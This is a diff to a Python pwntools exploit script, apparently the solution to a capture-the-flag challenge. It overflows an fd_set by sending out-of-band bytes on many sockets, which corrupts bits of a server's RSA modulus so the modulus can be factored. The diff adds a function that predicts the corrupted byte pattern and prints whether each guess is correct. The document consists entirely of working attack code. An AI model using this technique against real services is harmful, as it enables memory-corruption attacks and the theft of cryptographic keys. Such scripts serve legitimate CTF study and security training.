@@ -127,6 +127,16 @@ def resume_client(r):
     r.sendline(b'4')
     r.readuntil(b'Enter your choice: ')
 
+def predict_bit_pattern(bits, controlled_bits=33):
+    pattern = 0
+    for b in bits:
+        pattern |= 1 << b
+    # fd_sets are in units of 8 bytes. So to get bytes,
+    # round up to the next multiple of 64 and then divide
+    # by 8
+    num_bytes = ((controlled_bits + 63) // 64) * 8
+    return pattern.to_bytes(num_bytes, 'little')
+
 def solve(args):
     # Connect to the server on the main port
     r = remote(args.host, args.port)
@@ -162,6 +172,7 @@ def solve(args):
     while already_tried != set(range(len(overflow_sockets))):
         s = random.randint(0, len(overflow_sockets)-1)
         print(f"Picked overflow socket / bit {s} to corrupt")
+        predicted = predict_bit_pattern(already_tried | {s}, controlled_bits)
         sock = overflow_sockets[s]
         sock.send(b'1', socket.MSG_OOB)
         time.sleep(0.1)
@@ -170,8 +181,10 @@ def solve(args):
         pause_client(r)
         modulus = get_key(r)
         compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
+        guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
+        print(f"Prd: {predicted.hex()} ({guessed})")
         if modulus == current_modulus:
-            print(f"Key is unchanged; bit {s} must have already been 0")
+            print(f"Key is unchanged; bit {s} must have already been 1")
             continue
         current_modulus = modulus
         key = try_factor(modulus, exponent)
